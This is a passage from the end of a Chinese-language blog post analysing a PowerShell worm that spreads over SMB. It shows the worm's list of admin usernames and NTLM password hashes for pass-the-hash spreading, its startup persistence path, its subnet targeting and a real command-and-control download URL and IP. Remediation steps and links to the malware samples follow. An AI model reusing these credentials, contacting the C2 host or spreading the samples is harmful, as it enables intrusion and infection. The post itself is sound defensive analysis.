</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>[string[]]$global:alluser = @(&#34;administrator&#34;,&#34;admin&#34;)[string[]]$global:allpass = @(&#34;32ed87bdb5fdc5e9cba88547376818d4&#34;,&#34;8846f7eaee8fb117ad06bdd830b7586c&#34;,&#34;7b592e4f8178b4c75788531b2e747687&#34;,&#34;3fa45a060bd2693ae4c05b601d05ca0c&#34;,&#34;69943c5e63b4d2c104dbbcc15138b72b&#34;,&#34;588feb889288fb953b5f094d47d1565c&#34;,&#34;3dbde697d71690a769204beb12283678&#34;,&#34;df54de3f3438343202c1dd523d0265be&#34;,&#34;7ce21f17c0aee7fb9ceba532d0546ad6&#34;,&#34;2d7f1a5a61d3a96fb5159b5eef17adc6&#34;,&#34;6103d9d963c57275dd3533674708e7be&#34;,&#34;579110c49145015c47ecd267657d3174&#34;,&#34;af27efb60c7b238910efe2a7e0676a39&#34;,&#34;259745cb123a52aa2e693aaacca2db52&#34;,&#34;4057b60b514c5402dde3d29a1845c366&#34;,&#34;e8cd0e4a9e89eab931dc5338fcbec54a&#34;,&#34;f1351ac828428d74f6da2968089fc91f&#34;,&#34;b5fe2db507cc5ac540493d48fbd5fe33&#34;,&#34;12bdea0a1cb9486c067deaa851ac1609&#34;,&#34;f9e37e83b83c47a93c2f09f66408631b&#34;,&#34;b23a90d0aad9da3615fafc27a1b8baeb&#34;,&#34;a333f09e72c683f0205049d0db8b81fb&#34;,&#34;ad70819c5bc807280974d80f45982011&#34;,&#34;2d20d252a479f485cdf5e171d93985bf&#34;,&#34;0b6549421b2e7333e0e281f3ba5eea94&#34;,&#34;209c6174da490caeb422f3fa5a7ae634&#34;,&#34;a80c9cc3f8439ada25af064a874efe2d&#34;,&#34;22315d6ed1a7d5f8a7c98c40e9fa2dec&#34;,&#34;b963c57010f218edc2cc3c229b5e4d0f&#34;,&#34;96880159e785de5314803b1169768900&#34;,&#34;8ec60adea316d957d1cf532c5841758d&#34;,&#34;c22b315c040ae6e0efee3518d830362b&#34;,&#34;7a21990fcd3d759941e45c490f143d5f&#34;,&#34;328727b81ca05805a68ef26acb252039&#34;,&#34;31c72c210ecc03d1eae94fa496069448&#34;,&#34;209c6174da490caeb422f3fa5a7ae634&#34;,&#34;674e48b68c5cd0efd8f7e5faa87b3d1e&#34;,&#34;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&#34;,&#34;579110c49145015c47ecd267657d3174&#34;,&#34;f2477a144dff4f216ab81f2ac3e3207d&#34;,&#34;62b26c13b70e7d5a9724710a41e63688&#34;,&#34;5835048ce94ad0564e29a924a03510ef&#34;,&#34;7773c08920232397cae081704964b786&#34;,&#34;a4141712f19e9dd5adf16919bb38a95c&#34;,&#34;b3ec3e03e2a202cbd54fd104b8504fef&#34;,&#34;f9e37e83b83c47a93c2f09f66408631b&#34;,&#34;162e829be112225fedf856e38e1c65fe&#34;,&#34;f67f5e3f66efd7298be6acd32eeeb27c&#34;)
</span></span></code></pre></td></tr></table></div></div><p>SMB服务传播代码：</p><p><img src=https://images.payloads.online/5006062a-4f5f-11ec-a903-00d861bf4abb.png alt></p><p>会上传启动项：<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code></p><p>这个run.bat就是我拿到的种子了。</p><p>该木马涵盖了Windows SMB客户端的所有代码，以及哈希传递技术的所有功能。</p><p>代码有很多都是采用了Invoke-SMBClient。</p><p>优先感染子网：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>10.
</span></span><span style=display:flex><span>172.
</span></span><span style=display:flex><span>192.168.
</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/5046ffe0-4f5f-11ec-8229-00d861bf4abb.png alt></p><p>其中在开始横向传播之前，它还会下载一个powershell代码：</p><p><img src=https://images.payloads.online/50afcbc4-4f5f-11ec-9c8c-00d861bf4abb.png alt></p><p>但是目前这个域名已经无法访问，无法继续进行跟进。</p><p><code>http://p.beahh.com/upgrade.php?ver=1&amp;mac=</code></p><p>其中在<code>$bytebase64</code>中发现了<code>run.bat</code>的代码：</p><p><img src=https://images.payloads.online/50ef6b44-4f5f-11ec-a7ce-00d861bf4abb.png alt></p><h2 id=0x04-预警与排查方案>0x04 预警与排查方案</h2><ul><li>1.开启Windows防火墙、关闭445端口。</li><li>2.防火墙禁止向<code>172.104.177.202</code>建立连接。</li><li>3.防火墙禁止与<code>*.beahh.com</code>域名的解析。</li><li>4.更改操作系统账号密码。</li><li>5.删除<code>Certificate</code>任务计划。</li><li>6.删除<code>Credentials</code>任务计划。</li><li>7.删除启动项<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code>。</li><li>8.删除<code>%appdata%\Microsoft\cred.ps1</code>。</li></ul><p>最主要就是禁止与<code>172.104.177.202</code>进行通信。</p><p>下载器样本：https://payloads.online/scripts/2019-02-23-downloader.txt</p><p>木马本体（解密后）：https://payloads.online/scripts/2019-02-23-res.txt</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents><ol><li><a href=#0x00-事件背景>0x00 事件背景</a></li><li><a href=#0x01-分析研讨>0x01 分析研讨</a></li><li><a href=#0x02-分析过程>0x02 分析过程</a><ol><li><a href=#解密第一层>解密第一层</a></li><li><a href=#解密第二层>解密第二层</a></li><li><a href=#解密第三层>解密第三层</a></li><li><a href=#解密第四层>解密第四层</a></li></ol></li><li><a href=#0x03-行为分析>0x03 行为分析</a></li><li><a href=#0x04-预警与排查方案>0x04 预警与排查方案</a></li></ol></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2019 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>